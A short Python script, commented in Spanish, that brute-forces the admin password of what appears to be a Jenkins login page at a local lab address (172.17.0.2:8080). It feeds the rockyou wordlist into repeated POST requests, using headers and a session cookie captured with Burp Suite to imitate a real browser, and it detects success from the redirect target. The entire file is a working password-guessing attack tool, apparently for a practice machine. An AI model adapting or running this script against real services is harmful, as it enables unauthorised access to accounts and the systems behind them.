import requests
import signal

# Para al recoger control + C
def salir(sig, frame):
    print("\nProceso interrumpido por el usuario. Saliendo...")
    exit()

signal.signal(signal.SIGINT, salir)

# url recogida con Burp Suite
url = 'http://172.17.0.2:8080/j_spring_security_check'

diccionario_rockyou = 'rockyou.txt'

# Cabeceras recogidas con Burp Suite para simular una solicitud legítima al servidor
cabeceras = {
    'Host': '172.17.0.2:8080',
    'Content-Length': '53',
    'Cache-Control': 'max-age=0',
    'Origin': 'http://172.17.0.2:8080',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://172.17.0.2:8080/login?from=%2F',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cookie': 'JSESSIONID.bf7957b4=node01sle4foqwpkmo19mjd02lgpyhu0.node0',
    'Connection': 'close'
}


# Leer el diccionario de contraseñas y realizar solicitudes POST para cada contraseña
with open(diccionario_rockyou, 'r') as file:
    for password in file:
        password_sin_espacio = password.strip()  # Eliminar espacios en blanco y saltos de línea

        acceso = {
            'j_username': 'admin',
            'j_password': password_sin_espacio,
            'from': '/',
            'Submit': ''
        }


        # Realizar la solicitud POST con los datos de acceso y las cabeceras
        respuesta = requests.post(url, data=acceso, headers=cabeceras, allow_redirects=False)

        # Verificar la respuesta para determinar si el acceso fue exitoso o no
        # si no es igual a la URL de error, entonces el acceso es exitoso
        if respuesta.status_code == 302 and respuesta.headers.get('Location') != 'http://172.17.0.2:8080/loginError':
            print("¡Acceso exitoso! Usuario admin y Contraseña encontrada: " + password_sin_espacio)
            exit(0)  # Salir del programa después de encontrar la contraseña correcta
            
        else:
            print("Intento fallido con contraseña: " + password_sin_espacio)